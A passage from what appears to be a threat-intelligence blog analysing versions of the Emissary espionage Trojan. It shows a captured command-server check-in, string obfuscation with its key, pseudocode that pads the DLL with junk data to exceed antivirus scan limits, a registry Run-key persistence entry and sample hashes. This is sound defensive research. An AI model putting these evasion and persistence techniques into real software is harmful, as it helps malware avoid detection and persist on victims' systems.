						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e35854996712-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span>/<span class="crayon-st">default</span><span class="crayon-sy">.</span><span class="crayon-e">aspx </span><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e35854996712-2"><span class="crayon-i">User</span>-<span class="crayon-i">Agent</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span>/<span class="crayon-cn">4.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">compatible</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">MSIE</span><span class="crayon-h"> </span><span class="crayon-cn">7.0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">5.1</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-671986a833e35854996712-3"><span class="crayon-i">Host</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">101.55.33.95</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e35854996712-4"><span class="crayon-i">Cache</span>-<span class="crayon-i">Control</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">no</span>-<span class="crayon-e">cache</span></div><div class="crayon-line" id="crayon-671986a833e35854996712-5"><span class="crayon-i">Cookie</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">guid</span>=<span class="crayon-cn">8cdef38c</span>-<span class="crayon-cn">808a</span>-<span class="crayon-cn">4e29</span>-<span class="crayon-i">af6e</span>-<span class="crayon-cn">7386f02d28f1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">op</span>=<span class="crayon-cn">101</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">SHO</span>=<span class="crayon-cn">172.16.107.130</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p></p>
<h4>Version 5.1</h4>
<p><strong>Date: 9/29/2015</strong></p>
<p>SHA256: 375190cc8e0e75cf771d66347ea2a04b6d1b59bf2f56823eb81270618f133e2d</p>
<p>Original Name: WinDLL.dll</p>
<p>For version 5.1 the malware author took out the exception handling in the Upload File command and obfuscated two strings within the Trojan to avoid detection. The strings exist in the Trojan in encrypted form and are decrypted using an algorithm that uses addition to each byte of ciphertext, using 65 ("A") as a key. The obfuscated strings, as seen below, involve the filename of the log file and the command prompt executable used to create the remote shell:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e36024289714" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
\xEF\xEF\xEF\x00\xF6\xF4\xF7\x02\xF7\x05\x04\x00\x04\xF4\x05\xED\x13\x0C\x0F = 000A758C8FEAE5F.TMP
\x22\x2C\x23\xED\x24\x37\x24 = cmd.exe</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e36024289714-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e36024289714-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e36024289714-1"><span class="crayon-sy">\</span><span class="crayon-i">xEF</span><span class="crayon-sy">\</span><span class="crayon-i">xEF</span><span class="crayon-sy">\</span><span class="crayon-i">xEF</span><span class="crayon-sy">\</span><span class="crayon-i">x00</span><span class="crayon-sy">\</span><span class="crayon-i">xF6</span><span class="crayon-sy">\</span><span class="crayon-i">xF4</span><span class="crayon-sy">\</span><span class="crayon-i">xF7</span><span class="crayon-sy">\</span><span class="crayon-i">x02</span><span class="crayon-sy">\</span><span class="crayon-i">xF7</span><span class="crayon-sy">\</span><span class="crayon-i">x05</span><span class="crayon-sy">\</span><span class="crayon-i">x04</span><span class="crayon-sy">\</span><span class="crayon-i">x00</span><span class="crayon-sy">\</span><span class="crayon-i">x04</span><span class="crayon-sy">\</span><span class="crayon-i">xF4</span><span class="crayon-sy">\</span><span class="crayon-i">x05</span><span class="crayon-sy">\</span><span class="crayon-i">xED</span><span class="crayon-sy">\</span><span class="crayon-i">x13</span><span class="crayon-sy">\</span><span class="crayon-i">x0C</span><span class="crayon-sy">\</span><span class="crayon-i">x0F</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">000A758C8FEAE5F.TMP</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e36024289714-2"><span class="crayon-sy">\</span><span class="crayon-i">x22</span><span class="crayon-sy">\</span><span class="crayon-i">x2C</span><span class="crayon-sy">\</span><span class="crayon-i">x23</span><span class="crayon-sy">\</span><span class="crayon-i">xED</span><span class="crayon-sy">\</span><span class="crayon-i">x24</span><span class="crayon-sy">\</span><span class="crayon-i">x37</span><span class="crayon-sy">\</span><span class="crayon-i">x24</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">cmd</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><strong>Date: 10/14/2015</strong></p>
<p>SHA256: e369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538</p>
<p>Original Name: WinDLL.dll</p>
<p>In an attempt to avoid detection based on PE header hashes, version 5.1 was recompiled without making any changes.</p>
<h4>Version 5.3</h4>
<p><strong>Date: 11/7/2015</strong></p>
<p>SHA256: 29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051</p>
<p>Original Name: WinDLL.dll</p>
<p>Emissary 5.3 moved some code used to create the remote shell out of a sub-function in an attempt to evade signatures used to detect the remote shell creation. For instance, in Emissary 5.1 the command handler would call an initial subfunction that would then call a second subfunction to carry out the activities to create and interact with the remote shell. In 5.3, the command handler calls an initial subfunction that carries out the activities to create and interact with the remote shell.</p>
<h4>Version 5.4</h4>
<p><strong>Date: 11/23/2015</strong></p>
<p>SHA256: 69b1d5454abe2475257defd9962a24a92411212c4f592de8765369a97f26c037 (Base DLL with junk data removed)</p>
<p>Original Name WinDLL.dll</p>
<p>Version 5.4 of Emissary was the basis for the blog “<a href="https://pwc.blogs.com/cyber_security_updates/2015/12/elise-security-through-obesity.html">ELISE: Security Through Obesity</a>” by Michael Yip of PWC. This blog provides a great analysis of this version of Emissary and we highly suggest reading it to become familiar with the Trojan.</p>
<p>There is one difference in the functional code between Emissary versions 5.3 and 5.4, which involves the removal of the command '107' used to update the Trojan. The string '107' still exists within the Trojan, however, the command handler does not check the C2 response for this command and the code used to update the Trojan has been removed.</p>
<p>The major difference between Emissary version 5.4 and all previous versions is how the Trojan is saved and loaded. First, the filenames of the various components of Emissary changed to the following; however, the filename for debug logs has not changed:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e37767489918" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
%APPDATA%\Programs\Syncmgr.dll -&gt; Loader Trojan
%APPDATA%\Programs\60HGBC00.DAT -&gt; Configuration File
%APPDATA%\Programs\WEB2013BW6.DAT -&gt; Emissary Trojan
%TEMP%\000A758C8FEAE5F.TMP -&gt; Log file</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e37767489918-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e37767489918-2">2</div><div class="crayon-num" data-line="crayon-671986a833e37767489918-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e37767489918-4">4</div><div class="crayon-num" data-line="crayon-671986a833e37767489918-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e37767489918-6">6</div><div class="crayon-num" data-line="crayon-671986a833e37767489918-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e37767489918-1"><span class="crayon-ta">%</span><span class="crayon-i">APPDATA</span><span class="crayon-sy">%</span><span class="crayon-sy">\</span><span class="crayon-i">Programs</span><span class="crayon-sy">\</span><span class="crayon-i">Syncmgr</span><span class="crayon-sy">.</span><span class="crayon-i">dll</span><span class="crayon-h"> </span>-<span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">Loader</span><span class="crayon-h"> </span><span class="crayon-i">Trojan</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e37767489918-2">&nbsp;</div><div class="crayon-line" id="crayon-671986a833e37767489918-3"><span class="crayon-ta">%</span><span class="crayon-i">APPDATA</span><span class="crayon-sy">%</span><span class="crayon-sy">\</span><span class="crayon-i">Programs</span><span class="crayon-sy">\</span><span class="crayon-cn">60HGBC00.DAT</span><span class="crayon-h"> </span>-<span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">Configuration</span><span class="crayon-h"> </span><span class="crayon-t">File</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e37767489918-4">&nbsp;</div><div class="crayon-line" id="crayon-671986a833e37767489918-5"><span class="crayon-ta">%</span><span class="crayon-i">APPDATA</span><span class="crayon-sy">%</span><span class="crayon-sy">\</span><span class="crayon-i">Programs</span><span class="crayon-sy">\</span><span class="crayon-i">WEB2013BW6</span><span class="crayon-sy">.</span><span class="crayon-i">DAT</span><span class="crayon-h"> </span>-<span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">Emissary</span><span class="crayon-h"> </span><span class="crayon-i">Trojan</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e37767489918-6">&nbsp;</div><div class="crayon-line" id="crayon-671986a833e37767489918-7"><span class="crayon-sy">%</span><span class="crayon-i">TEMP</span><span class="crayon-sy">%</span><span class="crayon-sy">\</span><span class="crayon-cn">000A758C8FEAE5F.TMP</span><span class="crayon-h"> </span>-<span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-e">Log </span><span class="crayon-i">file</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>In addition to file name changes, the biggest (pardon the pun) change involves the Loader Trojan (Syncmgr.dll) appending junk data to the end of the Emissary DLL file to make incredibly large files. The reason for creating such large files is to trick antivirus applications into not scanning the file, as it could exceed the maximum size of files the antivirus can scan (even VirusTotal has a maximum file size of 128MB). For instance, the following pseudo code contains two loops that will end up appending 524,288,000 bytes to the end of file, resulting in a DLL that exceeds 500MB in size:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e38749036618" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
WriteFile(hFile, buf_EmissaryDllFromResource, nNumberOfBytesToWrite, &amp;nNumberOfBytesToWrite, 0);
buf_junkData = 0;
ret_time = time(0);
srand(ret_time);
for ( i = 0; i &lt; 51200; ++i )
{
  for ( j = 0; j &lt; 640; ++j )
  {
    random_byte = rand() % 255;
    offset_in_buff_junkData = &amp;buf_junkData + 16 * j;
    dword_junkData = 0x1010101 * random_byte;
    *offset_in_buff_junkData = dword_junkData;
    *(offset_in_buff_junkData + 1) = dword_junkData;
    *(offset_in_buff_junkData + 2) = dword_junkData;
    *(offset_in_buff_junkData + 3) = dword_junkData;
  }
  WriteFile(hFile, &amp;buf_junkData, 0x2800u, &amp;nNumberOfBytesToWrite, 0);
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e38749036618-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e38749036618-2">2</div><div class="crayon-num" data-line="crayon-671986a833e38749036618-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e38749036618-4">4</div><div class="crayon-num" data-line="crayon-671986a833e38749036618-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e38749036618-6">6</div><div class="crayon-num" data-line="crayon-671986a833e38749036618-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e38749036618-8">8</div><div class="crayon-num" data-line="crayon-671986a833e38749036618-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e38749036618-10">10</div><div class="crayon-num" data-line="crayon-671986a833e38749036618-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e38749036618-12">12</div><div class="crayon-num" data-line="crayon-671986a833e38749036618-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e38749036618-14">14</div><div class="crayon-num" data-line="crayon-671986a833e38749036618-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e38749036618-16">16</div><div class="crayon-num" data-line="crayon-671986a833e38749036618-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e38749036618-18">18</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e38749036618-1"><span class="crayon-e">WriteFile</span><span class="crayon-sy">(</span><span class="crayon-i">hFile</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">buf_EmissaryDllFromResource</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">nNumberOfBytesToWrite</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">&amp;nNumberOfBytesToWrite, 0);</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e38749036618-2"><span class="crayon-i">buf_junkData</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e38749036618-3"><span class="crayon-i">ret_time</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">time</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e38749036618-4"><span class="crayon-e">srand</span><span class="crayon-sy">(</span><span class="crayon-i">ret_time</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e38749036618-5"><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-cn">51200</span><span class="crayon-sy">;</span><span class="crayon-h"> </span>++<span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e38749036618-6"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-671986a833e38749036618-7"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">j</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">j</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-cn">640</span><span class="crayon-sy">;</span><span class="crayon-h"> </span>++<span class="crayon-i">j</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e38749036618-8"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-671986a833e38749036618-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">random_byte</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">rand</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">%</span><span class="crayon-h"> </span><span class="crayon-cn">255</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e38749036618-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">offset_in_buff_junkData</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">&amp;buf_junkData + 16 * j;</span></div><div class="crayon-line" id="crayon-671986a833e38749036618-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">dword_junkData</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0x1010101</span><span class="crayon-h"> </span>*<span class="crayon-h"> </span><span class="crayon-i">random_byte</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e38749036618-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span>*<span class="crayon-i">offset_in_buff_junkData</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">dword_junkData</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e38749036618-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span>*<span class="crayon-sy">(</span><span class="crayon-i">offset_in_buff_junkData</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">dword_junkData</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e38749036618-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span>*<span class="crayon-sy">(</span><span class="crayon-i">offset_in_buff_junkData</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">dword_junkData</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e38749036618-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span>*<span class="crayon-sy">(</span><span class="crayon-i">offset_in_buff_junkData</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">dword_junkData</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e38749036618-16"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-671986a833e38749036618-17"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">WriteFile</span><span class="crayon-sy">(</span><span class="crayon-i">hFile</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">&amp;buf_junkData, 0x2800u, &amp;nNumberOfBytesToWrite, 0);</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e38749036618-18"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>With the new filenames, malware persistence is achieved via the following registry key:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e39543967603" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Syncmgr: "rundll32.exe "C:\Documents and Settings\[username]&gt;\Application Data\Programs\Syncmgr.dll",Setting"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e39543967603-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e39543967603-1"><span class="crayon-i">HKCU</span><span class="crayon-sy">\</span><span class="crayon-i">Software</span><span class="crayon-sy">\</span><span class="crayon-i">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-i">Windows</span><span class="crayon-sy">\</span><span class="crayon-i">CurrentVersion</span><span class="crayon-sy">\</span><span class="crayon-i">Run</span><span class="crayon-sy">\</span><span class="crayon-i">Syncmgr</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-s">"rundll32.exe "</span><span class="crayon-i">C</span><span class="crayon-sy">:</span><span class="crayon-sy">\</span><span class="crayon-e">Documents </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-i">Settings</span><span class="crayon-sy">\</span><span class="crayon-sy">[</span><span class="crayon-i">username</span><span class="crayon-sy">]</span><span class="crayon-h">&gt;</span><span class="crayon-sy">\</span><span class="crayon-e">Application </span><span class="crayon-i">Data</span><span class="crayon-sy">\</span><span class="crayon-i">Programs</span><span class="crayon-sy">\</span><span class="crayon-i">Syncmgr</span><span class="crayon-sy">.</span><span class="crayon-i">dll</span><span class="crayon-s">",Setting"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><strong>Date: 11/24/2015</strong></p>
<p>SHA256: bfceccdd553c7e26006bb044ea6d87e597c7cce08218068e31dc940e9f55b636 (Base DLL with junk data removed)</p>
<p>Original Name: WinDLL.dll</p>
<p>In another attempt to avoid detection based on PE header hashes, the Trojan was recompiled without making any changes.</p>
<h2>Conclusion</h2>
<p>The actors using Emissary, who were previously reported as behind Operation Lotus Blossom, have been active for at least seven years in Southeast Asia. They are persistent, evolve over time, and have enough resources to have multiple custom RATs that receive regular updates. The targeting is largely military or government, with some cases of higher education and high tech companies. They also have the ability to select and use appropriate decoys in multiple Asian languages that appear legitimate.</p>
<p>The use of Emissary appears to be focused only on Taiwan and Hong Kong, with regular malware updates to avoid detection and to increase the odds of success. Of particular note, there is an interesting coincidence between the timing of the publication of our Operation Lotus Blossom report and a flurry of Emissary updates. The first occurred ten days after publication and was followed by updates over increasingly shorter time frames, starting at roughly every three months and progressing to monthly by the final version discussed here. Until that publication, according to our research Emissary was updated roughly every two years. This indicates the threat actors may take note of threat intelligence reporting and are fully capable of making immediate changes when deemed necessary.</p>
<p>In addition to the malware evolution, the actors also shifted from solely spear-phishing targets with attachments to also compromising legitimate websites to host malware. The consistent updates to the Trojan and the shift in the actor’s TTPs suggests that this threat will continue to use Emissary in future espionage related attacks.</p>
<p>We have updated the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Emissary">Emissary</a> tag for Palo Alto Networks AutoFocus users to track this threat using the indicators discussed in this blog.</p>
<h4>Emissary Delivery Documents</h4>
<p>42b8898c07374b1fc6a4a33441aadf10e47f226d9d3bf3368a459c0e221dff73</p>
<p>37f752f89b0384291af23542efc08c01be962c04e3b2c881a8bc1f8771e9179f</p>
<p>52b7f93bd4c2d1b1818f2a9506551852e2e7b511c9298e71edb54a39f69f94f2</p>
<p>5cda2251059c34f55ac23941b56e248b9a1111e98f62c5a307eadbb9618592dd</p>
<p>70097adba2743653bc73d0a2909a13f2904dbbcc1ffdb4e9013a8e61866abf5c</p>
<p>9bb0288f7b98fac909ed91ec24dad0d5a31e3eec93a1641849d9dab56c23aa59</p>
<p>b201c89fd7bdfc625bacfd4850feaa81269d9b41ed10ba1f7c0cb1339f4a6abe</p>
<p>ddbe42fb03bf9f4b9144396e814f13cd7054dcf238234dcb838fa9643136c03a</p>
<p>e67d3cc1684c789c3bd02af7a68b783fd90dc6d2d660b174d533f4c0e07490f9</p>
<p>0c550fad82f2653bc13d9629357a2a56df82602ee0ce96aa5a31f885e3aa29df</p>
